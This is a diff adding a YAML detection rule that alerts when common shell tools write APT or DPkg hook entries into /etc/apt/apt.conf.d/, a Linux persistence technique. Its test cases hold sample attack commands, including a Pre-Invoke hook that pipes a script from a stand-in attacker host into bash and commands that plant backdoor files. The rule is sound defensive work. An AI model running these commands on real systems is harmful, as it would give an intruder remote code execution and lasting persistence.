@@ -1,0 +1,49 @@
+name: elastic_apt_hook_persistence
+mode: alert
+eval: |
+  (
+    (
+      e.process_args.contains("/etc/apt/apt.conf.d/") ||
+      e.process_args.contains("APT::Update::Pre-Invoke") ||
+      e.process_args.contains("APT::Update::Post-Invoke") ||
+      e.process_args.contains("DPkg::Pre-Install-Pkgs") ||
+      e.process_args.contains("DPkg::Post-Invoke")
+    ) &&
+    (
+      e.process_name == "echo" ||
+      e.process_name == "tee" ||
+      e.process_name == "cp" ||
+      e.process_name == "mv" ||
+      e.process_name == "bash" ||
+      e.process_name == "sh"
+    )
+  )
+tests:
+  - cleartext: "create APT hook file"
+    process_name: cp
+    process_args: "cp /tmp/backdoor /etc/apt/apt.conf.d/99backdoor"
+    should_match: true
+  - cleartext: "echo APT Pre-Invoke hook"
+    process_name: echo
+    process_args: "echo 'APT::Update::Pre-Invoke {\"curl http://attacker.com/shell.sh | bash\";}' > /etc/apt/apt.conf.d/99malicious"
+    should_match: true
+  - cleartext: "tee APT Post-Invoke"
+    process_name: tee
+    process_args: "tee -a /etc/apt/apt.conf.d/99persist"
+    should_match: true
+  - cleartext: "bash creating APT hook"
+    process_name: bash
+    process_args: "bash -c echo DPkg::Post-Invoke >> /etc/apt/apt.conf.d/90custom"
+    should_match: true
+  - cleartext: "move hook to apt.conf.d"
+    process_name: mv
+    process_args: "mv malicious.conf /etc/apt/apt.conf.d/"
+    should_match: true
+  - cleartext: "normal echo"
+    process_name: echo
+    process_args: "echo test"
+    should_match: false
+  - cleartext: "copy normal file"
+    process_name: cp
+    process_args: "cp file.txt /home/user/"
+    should_match: false
